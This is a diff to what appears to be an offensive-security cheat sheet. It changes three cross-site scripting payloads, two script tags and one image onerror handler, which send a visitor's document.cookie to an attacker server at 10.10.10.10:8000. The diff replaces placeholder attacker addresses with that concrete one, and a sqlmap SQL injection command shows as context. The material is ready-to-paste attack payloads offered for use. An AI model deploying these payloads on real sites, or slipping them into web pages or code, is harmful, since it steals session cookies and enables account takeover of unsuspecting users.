@@ -247,11 +247,11 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 ```Properties files
 # Redirect with cookies
-<script>document.location='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;</script>
-<script>fetch('http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie);</script>
+<script>document.location='http://10.10.10.10:8000/steal?cookie='+document.cookie;</script>
+<script>fetch('http://10.10.10.10:8000/steal?cookie='+document.cookie);</script>
 
 # Using image object (works in environments where script tags are filtered)
-<img src=x onerror="this.src='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;">
+<img src=x onerror="this.src='http://10.10.10.10:8000/steal?cookie='+document.cookie;">
 ```
 
 
